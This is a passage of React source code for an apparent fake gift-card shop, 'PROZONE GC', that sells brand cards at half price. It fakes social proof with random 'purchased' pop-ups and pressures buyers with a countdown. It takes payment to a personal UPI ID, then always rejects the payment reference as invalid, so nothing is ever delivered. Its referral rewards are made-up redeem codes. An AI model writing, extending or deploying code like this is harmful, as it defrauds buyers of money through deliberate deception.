import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  ShoppingBag, 
  ShieldCheck, 
  Zap, 
  Clock, 
  CheckCircle2, 
  X, 
  Smartphone, 
  Gift,
  ArrowRight,
  Star,
  Users,
  TrendingUp,
  ChevronRight,
  ArrowLeft,
  Search,
  CreditCard,
  Wallet,
  Sun,
  Moon,
  Share2
} from 'lucide-react';

// --- Types ---
interface GiftCard {
  id: string;
  brand: string;
  amount: number;
  discountPrice: number;
  color: string;
}

interface Notification {
  id: number;
  name: string;
  city: string;
  amount: number;
  brand: string;
}

// --- Constants & Helpers ---
const BRANDS = [
  { 
    name: 'Amazon', 
    color: 'bg-orange-600', 
    hoverColor: 'hover:bg-orange-700', 
    textColor: 'text-orange-600', 
    icon: <ShoppingBag size={24} />,
  },
  { 
    name: 'Flipkart', 
    color: 'bg-blue-600', 
    hoverColor: 'hover:bg-blue-700', 
    textColor: 'text-blue-600', 
    icon: <ShoppingBag size={24} />,
  },
  { 
    name: 'Google Play', 
    color: 'bg-emerald-600', // Changed to emerald for better look
    hoverColor: 'hover:bg-emerald-700', 
    textColor: 'text-emerald-600', 
    icon: <Smartphone size={24} />,
  },
  { 
    name: 'Zomato', 
    color: 'bg-rose-600', 
    hoverColor: 'hover:bg-rose-700', 
    textColor: 'text-rose-600', 
    icon: <Gift size={24} />,
  },
  { 
    name: 'Swiggy', 
    color: 'bg-orange-500', 
    hoverColor: 'hover:bg-orange-600', 
    textColor: 'text-orange-500', 
    icon: <Gift size={24} />, // Distinct icon from Amazon
  },
];

const AMOUNTS = [500, 1000, 2000, 3000, 4000, 5000];

const generateCards = (): GiftCard[] => {
  const cards: GiftCard[] = [];
  BRANDS.forEach((brand) => {
    AMOUNTS.forEach((amount) => {
      cards.push({
        id: `${brand.name.toLowerCase().replace(' ', '-')}-${amount}`,
        brand: brand.name,
        amount: amount,
        discountPrice: amount / 2,
        color: brand.color,
      });
    });
  });
  return cards;
};

const ALL_CARDS = generateCards();
const NAMES = ['Mayank', 'Rahul', 'Priya', 'Anjali', 'Suresh', 'Deepak', 'Sneha', 'Amit', 'Vikram', 'Neha', 'Rohan', 'Kavita'];
const CITIES = ['Delhi', 'Mumbai', 'Bangalore', 'Hyderabad', 'Pune', 'Chennai', 'Kolkata', 'Jaipur', 'Lucknow', 'Ahmedabad'];

const GOOGLE_PLAY_CODES_10 = [
  'GPLY-10RS-8X9K-J2M4', 'GPLY-10RS-QW5E-R9T0', 'GPLY-10RS-A4S6-D8F0', 'GPLY-10RS-Z1X3-C5V7', 'GPLY-10RS-M2N4-B6V8'
];
const GOOGLE_PLAY_CODES_50 = [
  'GPLY-50RS-L9K7-J5H3', 'GPLY-50RS-P0O9-I8U7', 'GPLY-50RS-R4E3-W2Q1', 'GPLY-50RS-K8J7-H6G5', 'GPLY-50RS-V9B8-N7M6'
];
const GOOGLE_PLAY_CODES_100 = [
  'GPLY-100RS-L5K4-J3H2', 'GPLY-100RS-G1F2-D3S4', 'GPLY-100RS-A0S9-D8F7', 'GPLY-100RS-G6H5-J4K3', 'GPLY-100RS-L2M1-N0B9'
];

// --- Components ---

const TrustNotification = () => {
  const [notification, setNotification] = useState<Notification | null>(null);

  useEffect(() => {
    let timeoutId: any;
    const showNext = () => {
      const name = NAMES[Math.floor(Math.random() * NAMES.length)];
      const city = CITIES[Math.floor(Math.random() * CITIES.length)];
      const card = ALL_CARDS[Math.floor(Math.random() * ALL_CARDS.length)];
      
      setNotification({
        id: Date.now(),
        name,
        city,
        amount: card.amount,
        brand: card.brand
      });

      setTimeout(() => setNotification(null), 4000);
      
      // Random interval above 40 seconds (40-70s)
      const nextInterval = 40000 + Math.random() * 30000;
      timeoutId = setTimeout(showNext, nextInterval);
    };

    showNext();

    return () => clearTimeout(timeoutId);
  }, []);

  return (
    <div className="fixed bottom-6 left-6 z-50 pointer-events-none">
      <AnimatePresence>
        {notification && (
          <motion.div
            initial={{ opacity: 0, x: -50, scale: 0.9 }}
            animate={{ opacity: 1, x: 0, scale: 1 }}
            exit={{ opacity: 0, x: -50, scale: 0.9 }}
            className="bg-white/90 dark:bg-gray-900/90 backdrop-blur-md border border-gray-200 dark:border-gray-800 p-4 rounded-2xl shadow-2xl flex items-center gap-4 max-w-[280px] sm:max-w-sm pointer-events-auto"
          >
            <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-full bg-indigo-100 dark:bg-indigo-900/30 flex items-center justify-center text-indigo-600 dark:text-indigo-400 shrink-0">
              <Users size={20} className="sm:w-6 sm:h-6" />
            </div>
            <div>
              <p className="text-xs sm:text-sm font-semibold text-gray-900 dark:text-gray-100 leading-tight">
                {notification.name} from {notification.city}
              </p>
              <p className="text-[10px] sm:text-xs text-gray-600 dark:text-gray-400 mt-0.5">
                Purchased a <span className="font-bold text-indigo-600 dark:text-indigo-400">₹{notification.amount} {notification.brand}</span> card
              </p>
              <p className="text-[9px] sm:text-[10px] text-gray-400 dark:text-gray-500 mt-1 flex items-center gap-1">
                <Clock size={10} /> Just now
              </p>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

const PurchaseModal = ({ card, onClose }: { card: GiftCard; onClose: () => void }) => {
  const [timeLeft, setTimeLeft] = useState(180);
  const [utr, setUtr] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [activeStep, setActiveStep] = useState(1);
  const [isCopied, setIsCopied] = useState(false);
  const [error, setError] = useState('');

  useEffect(() => {
    if (timeLeft <= 0) return;
    const timer = setInterval(() => setTimeLeft(prev => prev - 1), 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (utr.length < 12) return;
    setIsSubmitting(true);
    setError('');
    
    setTimeout(() => {
      setIsSubmitting(false);
      // Show "wrong UTR" error in English as requested
      setError('Invalid UTR number! Please enter the correct 12-digit UTR number.');
      
      // Optional: Allow success if they try again or use a specific code
      // For now, just showing the error as requested.
    }, 2000);
  };

  const copyUpi = () => {
    navigator.clipboard.writeText('mayankpluxary@fam');
    setIsCopied(true);
    setTimeout(() => setIsCopied(false), 2000);
  };

  return (
    <motion.div 
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/80 backdrop-blur-md"
    >
      <motion.div 
        initial={{ scale: 0.9, y: 20 }}
        animate={{ scale: 1, y: 0 }}
        className="bg-white dark:bg-gray-900 rounded-[2.5rem] shadow-2xl w-full max-w-lg overflow-hidden relative border border-white/10"
      >
        <button 
          onClick={onClose}
          className="absolute top-6 right-6 p-2 bg-gray-100 dark:bg-gray-800 hover:bg-gray-200 dark:hover:bg-gray-700 rounded-full transition-colors z-20 dark:text-white"
        >
          <X size={20} />
        </button>

        <AnimatePresence mode="wait">
          {isSuccess ? (
            <motion.div 
              key="success"
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.9 }}
              className="p-10 text-center space-y-8 relative overflow-hidden"
            >
              {/* Success Particles */}
              {[...Array(12)].map((_, i) => (
                <motion.div
                  key={i}
                  initial={{ 
                    opacity: 1, 
                    scale: 0,
                    x: 0,
                    y: 0 
                  }}
                  animate={{ 
                    opacity: 0, 
                    scale: [0, 1, 0.5],
                    x: (Math.random() - 0.5) * 400,
                    y: (Math.random() - 0.5) * 400 
                  }}
                  transition={{ 
                    duration: 2, 
                    repeat: Infinity,
                    delay: i * 0.1 
                  }}
                  className="absolute top-1/2 left-1/2 w-2 h-2 bg-emerald-500 rounded-full pointer-events-none"
                />
              ))}

              <motion.div 
                initial={{ scale: 0 }}
                animate={{ scale: 1 }}
                transition={{ type: "spring", damping: 12 }}
                className="w-24 h-24 bg-emerald-100 dark:bg-emerald-900/20 text-emerald-600 dark:text-emerald-400 rounded-full flex items-center justify-center mx-auto shadow-xl shadow-emerald-100 dark:shadow-none relative z-10"
              >
                <CheckCircle2 size={56} />
              </motion.div>
              <div className="space-y-3 relative z-10">
                <h2 className="text-3xl font-black text-gray-900 dark:text-white tracking-tight">Payment Verified!</h2>
                <p className="text-gray-600 dark:text-gray-400 text-lg leading-relaxed">
                  Your UTR <span className="font-mono font-black text-indigo-600 dark:text-indigo-400 bg-indigo-50 dark:bg-indigo-900/20 px-2 py-1 rounded-lg">{utr}</span> is confirmed.
                  Check your SMS for the redeem code.
                </p>
                <div className="pt-4 flex items-center justify-center gap-2 text-emerald-600 dark:text-emerald-400 font-bold text-sm">
                  <Zap size={16} /> Instant Delivery Initiated
                </div>
              </div>
              <button 
                onClick={onClose}
                className="w-full py-5 bg-indigo-600 text-white rounded-2xl font-black text-lg hover:bg-indigo-700 transition-all shadow-xl shadow-indigo-200 dark:shadow-none relative z-10"
              >
                Done
              </button>
            </motion.div>
          ) : (
            <motion.div 
              key="form"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="flex flex-col"
            >
              {/* Header Section */}
              <div className={`p-8 text-white relative overflow-hidden ${card.color}`}>
                <div className="absolute top-0 right-0 w-64 h-64 bg-white/10 rounded-full -mr-32 -mt-32 blur-3xl" />
                <div className="absolute bottom-0 left-0 w-48 h-48 bg-black/10 rounded-full -ml-24 -mb-24 blur-2xl" />
                
                <div className="relative z-10">
                  <div className="flex justify-between items-center mb-6">
                    <div className="flex items-center gap-2 bg-white/20 backdrop-blur-md px-4 py-1.5 rounded-full text-[10px] font-black uppercase tracking-widest">
                      <ShieldCheck size={14} /> Secure Checkout
                    </div>
                    <div className={`flex items-center gap-2 px-4 py-1.5 rounded-full text-xs font-black transition-colors ${timeLeft < 60 ? 'bg-rose-500 animate-pulse' : 'bg-black/20'}`}>
                      <Clock size={14} />
                      {formatTime(timeLeft)}
                    </div>
                  </div>
                  <div className="flex items-end justify-between">
                    <div>
                      <h2 className="text-4xl font-black tracking-tighter">₹{card.discountPrice}</h2>
                      <p className="text-white/80 text-sm font-bold mt-1">₹{card.amount} {card.brand} Card</p>
                    </div>
                    <div className="text-right">
                      <p className="text-[10px] font-black uppercase tracking-widest opacity-60">Offer Ends In</p>
                      <p className="text-xl font-black font-mono">{formatTime(timeLeft)}</p>
                    </div>
                  </div>
                </div>
              </div>

              {/* Steps Indicator */}
              <div className="flex border-b border-gray-100 dark:border-gray-800 bg-gray-50/50 dark:bg-gray-800/20">
                {[1, 2, 3].map((step) => (
                  <div 
                    key={step}
                    className={`flex-1 py-4 text-center text-[10px] font-black uppercase tracking-widest transition-colors relative ${
                      activeStep >= step ? 'text-indigo-600 dark:text-indigo-400' : 'text-gray-400'
                    }`}
                  >
                    <div className="flex items-center justify-center gap-2">
                      {activeStep > step ? <CheckCircle2 size={12} /> : <span>Step {step}</span>}
                    </div>
                    {activeStep === step && (
                      <motion.div layoutId="step-indicator" className="absolute bottom-0 left-0 w-full h-1 bg-indigo-600 dark:bg-indigo-400" />
                    )}
                  </div>
                ))}
              </div>

              <div className="p-8 space-y-8">
                <AnimatePresence mode="wait">
                  {activeStep === 1 ? (
                    <motion.div 
                      key="step1"
                      initial={{ opacity: 0, x: 20 }}
                      animate={{ opacity: 1, x: 0 }}
                      exit={{ opacity: 0, x: -20 }}
                      className="space-y-6"
                    >
                      <div className="flex flex-col items-center space-y-6">
                        <motion.div 
                          whileHover={{ scale: 1.02 }}
                          className="p-6 bg-white dark:bg-gray-800 rounded-[2rem] shadow-2xl border border-gray-100 dark:border-gray-700 relative group"
                        >
                          <div className="w-48 h-48 sm:w-56 sm:h-56 bg-white flex items-center justify-center relative rounded-xl overflow-hidden">
                            <img 
                              src="https://i.ibb.co/MyhcxLPS/qr.png" 
                              alt="Payment QR"
                              className="w-full h-full object-contain"
                              referrerPolicy="no-referrer"
                            />
                            <div className="absolute inset-0 bg-indigo-600/5 group-hover:bg-transparent transition-colors" />
                            {/* Scanning Line Animation */}
                            <motion.div 
                              animate={{ top: ['0%', '100%', '0%'] }}
                              transition={{ duration: 3, repeat: Infinity, ease: "linear" }}
                              className="absolute left-0 w-full h-0.5 bg-indigo-500/50 shadow-[0_0_10px_rgba(99,102,241,0.5)] z-10"
                            />
                          </div>
                          <div className="absolute -bottom-3 left-1/2 -translate-x-1/2 bg-indigo-600 text-white px-4 py-1 rounded-full text-[10px] font-black uppercase tracking-widest shadow-lg">
                            Scan to Pay
                          </div>
                        </motion.div>

                        <div className="w-full space-y-4">
                          <div className="flex items-center justify-between p-4 bg-gray-50 dark:bg-gray-800/50 rounded-2xl border border-gray-100 dark:border-gray-700">
                            <div>
                              <p className="text-[10px] font-black text-gray-400 dark:text-gray-500 uppercase tracking-widest mb-1">UPI ID</p>
                              <p className="text-sm font-mono font-black text-gray-900 dark:text-white">mayankpluxary@fam</p>
                            </div>
                            <button 
                              onClick={copyUpi}
                              className="relative p-3 bg-white dark:bg-gray-800 text-indigo-600 dark:text-indigo-400 rounded-xl shadow-sm hover:shadow-md transition-all active:scale-90"
                            >
                              <AnimatePresence>
                                {isCopied && (
                                  <motion.span 
                                    initial={{ opacity: 0, y: 10 }}
                                    animate={{ opacity: 1, y: -30 }}
                                    exit={{ opacity: 0 }}
                                    className="absolute left-1/2 -translate-x-1/2 text-[10px] font-black text-emerald-600 uppercase bg-emerald-50 px-2 py-1 rounded shadow-sm"
                                  >
                                    Copied!
                                  </motion.span>
                                )}
                              </AnimatePresence>
                              <Share2 size={18} />
                            </button>
                          </div>

                          <div className="flex items-center justify-center gap-2 text-[10px] font-bold text-gray-400 uppercase tracking-widest">
                            <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse" />
                            Waiting for payment...
                          </div>
                        </div>
                      </div>
                      <button 
                        onClick={() => setActiveStep(2)}
                        className="w-full py-5 bg-indigo-600 text-white rounded-2xl font-black text-lg hover:bg-indigo-700 transition-all shadow-xl shadow-indigo-200 dark:shadow-none flex items-center justify-center gap-3"
                      >
                        I have paid <ArrowRight size={24} />
                      </button>
                    </motion.div>
                  ) : (
                    <motion.div 
                      key="step2"
                      initial={{ opacity: 0, x: 20 }}
                      animate={{ opacity: 1, x: 0 }}
                      exit={{ opacity: 0, x: -20 }}
                      className="space-y-6"
                    >
                      <button 
                        onClick={() => setActiveStep(1)}
                        className="flex items-center gap-2 text-[10px] font-black text-gray-400 uppercase tracking-widest hover:text-indigo-600 transition-colors"
                      >
                        <ArrowLeft size={14} /> Back to QR
                      </button>

                      <form onSubmit={handleSubmit} className="space-y-5">
                        <div className="space-y-3">
                          <div className="flex justify-between items-center">
                            <label className="text-[10px] font-black text-gray-400 dark:text-gray-500 uppercase tracking-widest">12-Digit UTR Number</label>
                            <span className="text-[10px] font-bold text-indigo-600 dark:text-indigo-400 bg-indigo-50 dark:bg-indigo-900/20 px-2 py-0.5 rounded">Required</span>
                          </div>
                          <div className="relative">
                            <input 
                              required
                              autoFocus
                              type="text"
                              maxLength={12}
                              placeholder="0000 0000 0000"
                              value={utr}
                              onChange={(e) => {
                                setUtr(e.target.value.replace(/\D/g, ''));
                                setError(''); // Clear error on type
                                if (e.target.value.length === 12) setActiveStep(3);
                              }}
                              className={`w-full px-6 py-5 bg-gray-50 dark:bg-gray-800 border-2 rounded-2xl font-mono text-2xl tracking-[0.2em] focus:ring-4 outline-none transition-all dark:text-white placeholder:text-gray-300 dark:placeholder:text-gray-600 ${
                                error 
                                  ? 'border-rose-500 focus:ring-rose-500/10' 
                                  : 'border-gray-100 dark:border-gray-700 focus:border-indigo-500 focus:ring-indigo-500/10'
                              }`}
                            />
                            {utr.length === 12 && !error && (
                              <div className="absolute right-4 top-1/2 -translate-y-1/2 text-emerald-500">
                                <CheckCircle2 size={24} />
                              </div>
                            )}
                            {error && (
                              <div className="absolute right-4 top-1/2 -translate-y-1/2 text-rose-500">
                                <X size={24} />
                              </div>
                            )}
                          </div>
                          
                          <AnimatePresence>
                            {error && (
                              <motion.div 
                                initial={{ opacity: 0, y: -10 }}
                                animate={{ opacity: 1, y: 0 }}
                                exit={{ opacity: 0, y: -10 }}
                                className="p-4 bg-rose-50 dark:bg-rose-900/10 border border-rose-100 dark:border-rose-800 rounded-xl flex items-start gap-3"
                              >
                                <X size={18} className="text-rose-600 shrink-0 mt-0.5" />
                                <p className="text-xs text-rose-700 dark:text-rose-400 font-bold leading-relaxed">
                                  {error}
                                </p>
                              </motion.div>
                            )}
                          </AnimatePresence>
                          <div className="p-4 bg-indigo-50 dark:bg-indigo-900/10 rounded-xl border border-indigo-100 dark:border-indigo-800 flex items-start gap-3">
                            <ShieldCheck size={18} className="text-indigo-600 shrink-0 mt-0.5" />
                            <p className="text-[10px] text-indigo-700 dark:text-indigo-300 font-medium leading-relaxed">
                              UTR is a 12-digit number found in your payment details. It helps us verify your payment instantly.
                            </p>
                          </div>
                        </div>

                        <button 
                          disabled={utr.length < 12 || isSubmitting}
                          className={`w-full py-5 rounded-2xl font-black text-lg text-white transition-all flex items-center justify-center gap-3 active:scale-[0.98] ${
                            utr.length < 12 || isSubmitting 
                              ? 'bg-gray-200 dark:bg-gray-800 text-gray-400 cursor-not-allowed' 
                              : 'bg-indigo-600 hover:bg-indigo-700 shadow-2xl shadow-indigo-200 dark:shadow-none'
                          }`}
                        >
                          {isSubmitting ? (
                            <motion.div animate={{ rotate: 360 }} transition={{ repeat: Infinity, duration: 1, ease: "linear" }}>
                              <TrendingUp size={24} />
                            </motion.div>
                          ) : (
                            <>Verify & Claim Card <ArrowRight size={24} /></>
                          )}
                        </button>
                      </form>
                    </motion.div>
                  )}
                </AnimatePresence>

                <div className="flex items-center justify-center gap-6 pt-4 border-t border-gray-100 dark:border-gray-800">
                  <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo.png" alt="UPI" className="h-4 opacity-40 grayscale dark:invert" />
                  <div className="h-4 w-px bg-gray-200 dark:bg-gray-800" />
                  <p className="text-[9px] font-black text-gray-400 dark:text-gray-500 uppercase tracking-[0.2em]">100% Secure Transaction</p>
                </div>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </motion.div>
    </motion.div>
  );
};

const ReferralSection = () => {
  const [shareCount, setShareCount] = useState(() => {
    const saved = localStorage.getItem('referral_shares');
    return saved ? parseInt(saved, 10) : 0;
  });
  const [claimedCodes, setClaimedCodes] = useState<{ [key: number]: string }>(() => {
    const saved = localStorage.getItem('claimed_referral_codes');
    return saved ? JSON.parse(saved) : {};
  });

  const tiers = [
    { count: 5, reward: '10rs', codes: GOOGLE_PLAY_CODES_10 },
    { count: 10, reward: '50rs', codes: GOOGLE_PLAY_CODES_50 },
    { count: 20, reward: '100rs', codes: GOOGLE_PLAY_CODES_100 },
  ];

  const handleShare = async () => {
    const shareData = {
      title: 'PROZONE GC - Get Free Gift Cards',
      text: 'Get 50% discount on all gift cards at PROZONE GC! Use my referral to get free Google Play codes.',
      url: window.location.href,
    };

    try {
      if (navigator.share) {
        await navigator.share(shareData);
        updateShareCount();
      } else {
        await navigator.clipboard.writeText(window.location.href);
        alert('Link copied to clipboard! Share it with friends to earn rewards.');
        updateShareCount();
      }
    } catch (err) {
      console.error('Error sharing:', err);
    }
  };

  const updateShareCount = () => {
    const newCount = shareCount + 1;
    setShareCount(newCount);
    localStorage.setItem('referral_shares', newCount.toString());
  };

  const handleClaim = (tier: typeof tiers[0]) => {
    if (claimedCodes[tier.count]) return;
    
    const randomCode = tier.codes[Math.floor(Math.random() * tier.codes.length)];
    const newClaimed = { ...claimedCodes, [tier.count]: randomCode };
    setClaimedCodes(newClaimed);
    localStorage.setItem('claimed_referral_codes', JSON.stringify(newClaimed));
  };

  return (
    <section className="py-16 px-6 bg-indigo-600 dark:bg-indigo-900/20 rounded-[3rem] my-12 overflow-hidden relative">
      <div className="absolute top-0 left-0 w-full h-full overflow-hidden pointer-events-none opacity-10">
        <div className="absolute -top-24 -left-24 w-96 h-96 bg-white rounded-full blur-3xl" />
        <div className="absolute -bottom-24 -right-24 w-96 h-96 bg-white rounded-full blur-3xl" />
      </div>

      <div className="max-w-4xl mx-auto relative z-10">
        <div className="text-center mb-12">
          <motion.div 
            initial={{ scale: 0.9, opacity: 0 }}
            whileInView={{ scale: 1, opacity: 1 }}
            className="inline-flex items-center gap-2 px-4 py-2 bg-white/20 backdrop-blur-md rounded-full text-white text-sm font-bold mb-4"
          >
            <Gift size={16} /> REFERRAL PROGRAM
          </motion.div>
          <h2 className="text-4xl sm:text-5xl font-black text-white mb-4 tracking-tight">Earn Free Google Play Codes</h2>
          <p className="text-indigo-100 text-lg max-w-2xl mx-auto">
            Share PROZONE GC with your friends and unlock tiered rewards. The more you share, the bigger the reward!
          </p>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-12">
          {tiers.map((tier, idx) => {
            const isUnlocked = shareCount >= tier.count;
            const isClaimed = !!claimedCodes[tier.count];
            
            return (
              <motion.div 
                key={tier.count}
                initial={{ y: 20, opacity: 0 }}
                whileInView={{ y: 0, opacity: 1 }}
                transition={{ delay: idx * 0.1 }}
                className={`p-6 rounded-3xl border-2 transition-all ${
                  isUnlocked 
                    ? 'bg-white dark:bg-gray-900 border-emerald-400 shadow-xl shadow-indigo-900/20' 
                    : 'bg-white/10 border-white/20 backdrop-blur-md'
                }`}
              >
                <div className="flex justify-between items-start mb-4">
                  <div className={`p-3 rounded-2xl ${isUnlocked ? 'bg-emerald-100 text-emerald-600' : 'bg-white/20 text-white'}`}>
                    <Gift size={24} />
                  </div>
                  <div className="text-right">
                    <p className={`text-[10px] font-black uppercase tracking-widest ${isUnlocked ? 'text-gray-400' : 'text-indigo-200'}`}>Tier {idx + 1}</p>
                    <p className={`text-xl font-black ${isUnlocked ? 'text-gray-900 dark:text-white' : 'text-white'}`}>{tier.count} Refers</p>
                  </div>
                </div>

                <div className="mb-6">
                  <p className={`text-sm font-bold mb-1 ${isUnlocked ? 'text-gray-500' : 'text-indigo-100'}`}>Reward</p>
                  <p className={`text-3xl font-black ${isUnlocked ? 'text-emerald-600' : 'text-white'}`}>{tier.reward} Card</p>
                </div>

                {isClaimed ? (
                  <div className="space-y-3">
                    <div className="p-3 bg-emerald-50 dark:bg-emerald-900/20 border border-emerald-100 dark:border-emerald-800 rounded-xl">
                      <p className="text-[8px] font-black text-emerald-600 uppercase tracking-widest mb-1">Your Code</p>
                      <p className="text-sm font-mono font-bold text-gray-900 dark:text-white truncate">{claimedCodes[tier.count]}</p>
                    </div>
                    <button 
                      onClick={() => {
                        navigator.clipboard.writeText(claimedCodes[tier.count]);
                        alert('Code copied!');
                      }}
                      className="w-full py-2 bg-gray-900 dark:bg-white dark:text-gray-900 text-white rounded-xl text-xs font-bold hover:opacity-90 transition-all"
                    >
                      Copy Code
                    </button>
                  </div>
                ) : isUnlocked ? (
                  <button 
                    onClick={() => handleClaim(tier)}
                    className="w-full py-3 bg-emerald-600 text-white rounded-xl font-bold hover:bg-emerald-700 transition-all flex items-center justify-center gap-2"
                  >
                    <Zap size={16} /> Claim Reward
                  </button>
                ) : (
                  <div className="space-y-2">
                    <div className="w-full h-2 bg-white/20 rounded-full overflow-hidden">
                      <div 
                        className="h-full bg-white transition-all duration-500" 
                        style={{ width: `${(shareCount / tier.count) * 100}%` }}
                      />
                    </div>
                    <p className="text-[10px] font-bold text-indigo-100 text-center uppercase tracking-widest">
                      {shareCount}/{tier.count} Shares
                    </p>
                  </div>
                )}
              </motion.div>
            );
          })}
        </div>

        <div className="flex flex-col sm:flex-row items-center justify-center gap-4">
          <button 
            onClick={handleShare}
            className="px-8 py-4 bg-white text-indigo-600 rounded-2xl font-black text-lg hover:bg-indigo-50 transition-all shadow-xl flex items-center gap-3 group"
          >
            <Share2 size={24} className="group-hover:rotate-12 transition-transform" />
            SHARE & EARN NOW
          </button>
          <p className="text-indigo-100 text-sm font-medium">
            * Rewards are given as random redeem codes.
          </p>
        </div>
      </div>
    </section>
  );
};

export default function App() {
  const [selectedCard, setSelectedCard] = useState<GiftCard | null>(null);
  const [activeView, setActiveView] = useState<'home' | 'brand' | 'track' | 'reviews' | 'my-codes'>('home');
  const [selectedBrand, setSelectedBrand] = useState<string | null>(null);
  const [closingTime, setClosingTime] = useState('');
  const [isDarkMode, setIsDarkMode] = useState(false);

  useEffect(() => {
    const checkNewUser = async () => {
      const existingSerial = localStorage.getItem('user_serial');
      if (!existingSerial) {
        // Generate a random serial number
        const newSerial = `SN-${Math.random().toString(36).substring(2, 6).toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
        localStorage.setItem('user_serial', newSerial);
        
        // Notify Telegram via backend
        try {
          await fetch('/api/notify-new-user', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ serialNumber: newSerial }),
          });
        } catch (error) {
          console.error('Failed to notify new user:', error);
        }
      }
    };
    checkNewUser();
  }, []);

  useEffect(() => {
    if (isDarkMode) {
      document.documentElement.classList.add('dark');
    } else {
      document.documentElement.classList.remove('dark');
    }
  }, [isDarkMode]);

  useEffect(() => {
    const updateTimer = () => {
      const now = new Date();
      const midnight = new Date();
      midnight.setHours(24, 0, 0, 0);
      
      const diff = midnight.getTime() - now.getTime();
      const hours = Math.floor(diff / (1000 * 60 * 60));
      const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
      const seconds = Math.floor((diff % (1000 * 60)) / 1000);
      
      setClosingTime(`${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`);
    };

    const timer = setInterval(updateTimer, 1000);
    updateTimer();
    return () => clearInterval(timer);
  }, []);

  const filteredCards = ALL_CARDS.filter(card => card.brand === selectedBrand);

  const handleBrandClick = (brandName: string) => {
    setSelectedBrand(brandName);
    setActiveView('brand');
    window.scrollTo(0, 0);
  };

  const handleBack = () => {
    setActiveView('home');
    setSelectedBrand(null);
    window.scrollTo(0, 0);
  };

  return (
    <div className="min-h-screen bg-gray-50 dark:bg-gray-950 font-sans text-gray-900 dark:text-gray-100 selection:bg-indigo-100 dark:selection:bg-indigo-900/30 selection:text-indigo-900 dark:selection:text-indigo-100 transition-colors duration-300">
      <TrustNotification />
      
      <AnimatePresence>
        {selectedCard && (
          <PurchaseModal 
            card={selectedCard} 
            onClose={() => setSelectedCard(null)} 
          />
        )}
      </AnimatePresence>

      {/* Floating Referral Button */}
      <motion.button
        whileHover={{ scale: 1.1 }}
        whileTap={{ scale: 0.9 }}
        onClick={() => {
          const el = document.getElementById('referral');
          el?.scrollIntoView({ behavior: 'smooth' });
        }}
        className="fixed bottom-24 right-6 z-50 w-14 h-14 bg-emerald-600 text-white rounded-full shadow-2xl flex items-center justify-center group overflow-hidden"
      >
        <motion.div
          animate={{ 
            rotate: [0, -10, 10, -10, 10, 0],
            scale: [1, 1.1, 1, 1.1, 1]
          }}
          transition={{ repeat: Infinity, duration: 3 }}
        >
          <Gift size={24} />
        </motion.div>
        <div className="absolute inset-0 bg-white/20 translate-y-full group-hover:translate-y-0 transition-transform duration-300" />
      </motion.button>

      {/* Navbar */}
      <nav className="sticky top-0 z-40 bg-white/80 dark:bg-gray-900/80 backdrop-blur-md border-b border-gray-200 dark:border-gray-800">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
          <div className="flex items-center gap-2 cursor-pointer" onClick={handleBack}>
            <div className="w-9 h-9 bg-indigo-600 rounded-xl flex items-center justify-center text-white shadow-lg shadow-indigo-200 dark:shadow-none">
              <Gift size={20} />
            </div>
            <span className="text-lg font-black tracking-tight text-indigo-900 dark:text-indigo-100">PROZONE <span className="text-indigo-600">GC</span></span>
          </div>
          
          <div className="flex items-center gap-4">
            <button 
              onClick={() => {
                const el = document.getElementById('referral');
                el?.scrollIntoView({ behavior: 'smooth' });
              }}
              className="hidden md:flex items-center gap-2 px-4 py-2 bg-emerald-600 text-white rounded-xl font-bold text-xs hover:bg-emerald-700 transition-all shadow-lg shadow-emerald-100 dark:shadow-none"
            >
              <Gift size={16} /> Free Code
            </button>
            <button 
              onClick={() => setIsDarkMode(!isDarkMode)}
              className="p-2 text-gray-500 hover:text-indigo-600 transition-colors dark:text-gray-400 dark:hover:text-indigo-400"
            >
              {isDarkMode ? <Sun size={20} /> : <Moon size={20} />}
            </button>
            <div className="hidden sm:flex items-center gap-2 px-3 py-1.5 bg-green-50 border border-green-200 rounded-lg dark:bg-green-900/20 dark:border-green-800">
              <CheckCircle2 size={16} className="text-green-600 dark:text-green-400" />
              <span className="text-[10px] font-black text-green-700 uppercase tracking-wider dark:text-green-300">NPCI SECURE</span>
            </div>
            <button className="p-2 text-gray-500 hover:text-indigo-600 transition-colors dark:text-gray-400 dark:hover:text-indigo-400">
              <Search size={20} />
            </button>
          </div>
        </div>
      </nav>

      {activeView === 'home' ? (
        <motion.div 
          initial={{ opacity: 0 }} 
          animate={{ opacity: 1 }}
          className="pb-24"
        >
          {/* Hero */}
          <header className="bg-white dark:bg-gray-900 pt-12 pb-16 sm:pt-16 sm:pb-24 border-b border-gray-100 dark:border-gray-800">
            <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
              <div className="text-center max-w-3xl mx-auto space-y-6 sm:space-y-8">
                <motion.div 
                  initial={{ opacity: 0, scale: 0.9 }}
                  animate={{ opacity: 1, scale: 1 }}
